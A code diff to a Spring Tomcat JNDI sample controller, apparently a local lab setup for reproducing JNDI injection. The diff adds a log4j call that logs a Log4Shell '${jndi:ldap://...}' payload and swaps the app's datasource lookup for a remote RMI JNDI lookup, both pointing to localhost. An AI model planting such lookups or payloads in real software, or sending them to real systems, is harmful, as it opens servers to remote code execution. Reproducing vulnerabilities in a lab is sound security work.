@@ -15,6 +15,8 @@
  */
 
 package sample.tomcat.jndi.web;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 import javax.naming.InitialContext;
 import javax.naming.NamingException;
@@ -40,8 +42,12 @@ public class SampleController {
 	@RequestMapping("/direct")
 	@ResponseBody
 	public String direct() throws NamingException {
+		logger.error("${jndi:ldap://127.0.0.1:1389/ycy8on}");
 		return "DataSource retrieved directly from JNDI: " +
-				new InitialContext().lookup("java:comp/env/jdbc/myDataSource");
+//				new InitialContext().lookup("java:comp/env/jdbc/myDataSource");
+				new InitialContext().lookup("rmi://127.0.0.1:1099/ycy8on");
 	}
+
+
 
 }
